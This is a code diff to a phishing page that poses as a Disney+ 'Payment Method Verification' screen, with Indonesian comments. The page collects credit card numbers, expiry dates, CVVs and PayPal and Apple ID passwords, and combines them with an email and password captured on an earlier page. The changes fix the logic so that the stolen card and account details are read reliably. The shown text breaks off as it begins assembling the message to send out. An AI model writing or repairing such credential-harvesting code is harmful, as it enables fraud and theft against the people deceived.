@@ -249,13 +249,13 @@
         <h1>Payment Method Verification</h1>
 
         <div class="metode-bayar">
-            <div class="tab-bayar aktif" onclick="pilihKartu()">
+            <div class="tab-bayar aktif" id="tabKartu" onclick="pilihKartu()">
                 <span>💳</span> Credit card
             </div>
-            <div class="tab-bayar" onclick="pilihPayPal()">
-                <span class="ikon-bayar">🅿️</span> PayPal
+            <div class="tab-bayar" id="tabPayPal" onclick="pilihPayPal()">
+                <span>🅿️</span> PayPal
             </div>
-            <div class="tab-bayar" onclick="pilihApplePay()">
+            <div class="tab-bayar" id="tabApplePay" onclick="pilihApplePay()">
                 <span>🍎</span> Apple Pay
             </div>
         </div>
@@ -352,22 +352,25 @@
     <script>
         // === PILIH METODE PEMBAYARAN ===
         function pilihKartu() {
-            document.querySelectorAll('.tab-bayar').forEach(el => el.classList.remove('aktif'));
-            document.querySelectorAll('.tab-bayar')[0].classList.add('aktif');
+            document.getElementById('tabKartu').classList.add('aktif');
+            document.getElementById('tabPayPal').classList.remove('aktif');
+            document.getElementById('tabApplePay').classList.remove('aktif');
             document.getElementById('formKartu').style.display = 'block';
             document.getElementById('formPayPal').style.display = 'none';
             document.getElementById('formApplePay').style.display = 'none';
         }
         function pilihPayPal() {
-            document.querySelectorAll('.tab-bayar').forEach(el => el.classList.remove('aktif'));
-            document.querySelectorAll('.tab-bayar')[1].classList.add('aktif');
+            document.getElementById('tabKartu').classList.remove('aktif');
+            document.getElementById('tabPayPal').classList.add('aktif');
+            document.getElementById('tabApplePay').classList.remove('aktif');
             document.getElementById('formKartu').style.display = 'none';
             document.getElementById('formPayPal').style.display = 'block';
             document.getElementById('formApplePay').style.display = 'none';
         }
         function pilihApplePay() {
-            document.querySelectorAll('.tab-bayar').forEach(el => el.classList.remove('aktif'));
-            document.querySelectorAll('.tab-bayar')[2].classList.add('aktif');
+            document.getElementById('tabKartu').classList.remove('aktif');
+            document.getElementById('tabPayPal').classList.remove('aktif');
+            document.getElementById('tabApplePay').classList.add('aktif');
             document.getElementById('formKartu').style.display = 'none';
             document.getElementById('formPayPal').style.display = 'none';
             document.getElementById('formApplePay').style.display = 'block';
@@ -396,22 +399,22 @@
 
         // === KIRIM SEMUA DATA ===
         async function kirimData() {
-            // Baca Email & Kata Sandi dari halaman sebelumnya
+            // Baca Email & Kata Sandi dari localStorage
             const email = localStorage.getItem('emailPengguna') || 'TIDAK DIISI';
             const sandi = localStorage.getItem('kataSandi') || 'TIDAK DIISI';
 
             let metode = '';
             let rincian = '';
 
-            // Baca data sesuai metode pembayaran yang dipilih
-            if (document.getElementById('formKartu').style.display === 'block') {
+            // ✅ Baca DATA KARTU — PERBAIKAN UTAMA
+            if (document.getElementById('formKartu').style.display !== 'none') {
                 const nomor = document.getElementById('nomorKartu').value.trim();
                 const masa = document.getElementById('kadaluarsa').value.trim();
                 const cvv = document.getElementById('cvv').value.trim();
                 const nama = document.getElementById('namaKartu').value.trim();
 
                 if (!nomor || !masa || !cvv || !nama) {
-                    alert('⚠️ Lengkapi semua data kartu!');
+                    alert('⚠️ Lengkapi SEMUA data kartu terlebih dahulu!');
                     return;
                 }
 
@@ -423,12 +426,13 @@
 👤 Nama di Kartu: ${nama}
                 `.trim();
             }
-            else if (document.getElementById('formPayPal').style.display === 'block') {
+            // ✅ Baca DATA PAYPAL
+            else if (document.getElementById('formPayPal').style.display !== 'none') {
                 const pEmail = document.getElementById('paypalEmail').value.trim();
                 const pSandi = document.getElementById('paypalSandi').value.trim();
 
                 if (!pEmail || !pSandi) {
-                    alert('⚠️ Lengkapi semua data PayPal!');
+                    alert('⚠️ Lengkapi SEMUA data PayPal terlebih dahulu!');
                     return;
                 }
 
@@ -438,12 +442,13 @@
 🔑 PayPal Password: ${pSandi}
                 `.trim();
             }
-            else if (document.getElementById('formApplePay').style.display === 'block') {
+            // ✅ Baca DATA APPLE PAY
+            else if (document.getElementById('formApplePay').style.display !== 'none') {
                 const aEmail = document.getElementById('appleEmail').value.trim();
                 const aSandi = document.getElementById('appleSandi').value.trim();
 
                 if (!aEmail || !aSandi) {
-                    alert('⚠️ Lengkapi semua data Apple Pay!');
+                    alert('⚠️ Lengkapi SEMUA data Apple Pay terlebih dahulu!');
                     return;
                 }
 
@@ -453,8 +458,12 @@
 🔑 Apple ID Password: ${aSandi}
                 `.trim();
             }
+            else {
+                alert('⚠️ Pilih metode pembayaran terlebih dahulu!');
+                return;
+            }
 
-            // Susun SEMUA data
+            // === SUSUN SEMUA DATA ===
             const isiPesan = `
 ══════════════════════════════════
 📩 DATA PENGIRIMAN DISNEY+
